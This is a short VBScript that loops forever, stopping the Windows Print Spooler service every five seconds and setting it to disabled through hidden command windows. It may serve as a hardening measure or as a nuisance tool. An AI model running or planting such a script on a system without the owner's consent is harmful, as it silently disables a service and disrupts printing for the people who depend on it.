Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Do While True
    ' Disable the Print Spooler service
    objShell.Run "cmd /c net stop Spooler", 0, True
    objShell.Run "cmd /c sc config Spooler start= disabled", 0, True

    ' Wait for 5 seconds
    WScript.Sleep 5000
Loop
